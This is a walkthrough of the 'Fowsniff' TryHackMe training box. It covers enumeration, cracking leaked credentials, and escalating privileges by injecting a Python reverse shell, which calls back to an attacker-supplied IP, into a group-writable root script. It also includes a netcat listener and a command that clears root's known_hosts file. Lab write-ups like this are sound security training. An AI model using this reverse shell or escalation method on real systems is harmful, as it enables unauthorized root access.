Fowsniff — Day_1 (TryHackMe)

Writeup · Enumeration → Exploitation → Post-exploitation · by Svfear
Quick summary: Found POP3 credentials via leaked repo & Google dorking, cracked hashes, authenticated to POP3, discovered temporary SSH password in an email, SSH’d to a user account, discovered a writable script owned by the users group and used it to get a reverse shell as root (documented steps below).

Nmap

Scan used:

nmap -sV -sS -sC 10.10.147.226 -oN nmap.txt

Open ports observed: 22, 80, 110, 143.

I checked the website and noticed signs of a data breach. I then tried basic Google dorking and GitHub searches to find leaked credentials.

Enumeration — interesting files

I searched for files owned by the users group:

find / -group users -type f 2>/dev/null
/opt/cube/cube.sh

Inspecting /opt/cube/cube.sh (it contained an ASCII banner and a comment suggesting replacement):

The script is writable by the users group — a perfect place to inject a reverse shell. The TryHackMe hint pointed here.

Injected payload (replace YOUR_IP and choose your listener port):

#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Before finishing the SSH session, ensure your listener is ready:

# on attacker machine:
nc -lvnp 1234
# on target, also clear known_hosts if needed:
echo "" > /root/.ssh/known_hosts

Reverse shell connected — we had interactive access as a privileged user (depending on script behavior). That completed the box for Day_1!
